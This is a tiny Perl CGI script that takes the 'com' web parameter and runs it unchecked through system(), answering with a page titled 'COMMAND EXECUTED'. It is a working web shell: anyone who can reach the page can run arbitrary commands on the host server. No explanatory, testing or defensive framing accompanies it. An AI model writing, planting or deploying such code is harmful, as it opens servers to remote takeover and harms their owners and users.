#!/usr/bin/perl -w
use CGI':standard';
print "content-type:text/html\n\n";
$c=param('com');
$v=system($c);
print "<html>\n";
print "<head><title>COMMAND EXECUTED</title></head>\n";
print "<body><h1>","\n";
print "</h1></body></html>\n";
